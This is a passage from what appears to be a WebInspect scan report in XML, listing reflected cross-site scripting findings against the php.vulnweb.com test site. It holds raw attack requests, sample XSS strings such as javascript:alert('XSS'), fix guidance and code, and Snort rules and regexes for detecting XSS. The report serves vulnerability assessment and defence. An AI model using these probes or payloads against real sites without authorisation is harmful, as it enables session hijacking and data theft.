</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="BC5C4E46D6B6FDD78DE6098D48C8DAF2"><![CDATA[GET /pictures/1.jpg.tn/%32%33%34%37%33 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="BC5C4E46D6B6FDD78DE6098D48C8DAF2";PSID="210657288A91100C4123A79F42F2ACAF";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2532%2533%2534%2537%2533";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="c22c1f98";
X-Request-Memo: ID="30aa8ed4";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3665
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/1.jpg.tn/23473");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:54:33</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="BC5C4E46D6B6FDD78DE6098D48C8DAF2"><Method>GET</Method><Path>/pictures/1.jpg.tn/</Path><File>%32%33%34%37%33</File><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="BC5C4E46D6B6FDD78DE6098D48C8DAF2";PSID="210657288A91100C4123A79F42F2ACAF";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2532%2533%2534%2537%2533";AttackStringProps="Attack";tid="41";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="c22c1f98";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="30aa8ed4";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/1.jpg.tn/23473");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:54:33</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3665</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="4AC9AF0DF3408621F05AF28CD51B37CE"><URL>http://php.vulnweb.com:80/pictures/6.jpg.tn/%38%38%35%37%34</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="0310e705-51eb-4dc9-ac77-efab4cecd068"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /pictures/6.jpg.tn/%38%38%35%37%34 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="4AC9AF0DF3408621F05AF28CD51B37CE";PSID="B219613770D223B9C34337D7F6EBA383";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2538%2538%2535%2537%2534";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="ce96ffd6";
X-Request-Memo: ID="9300568b";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2000" length="5" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
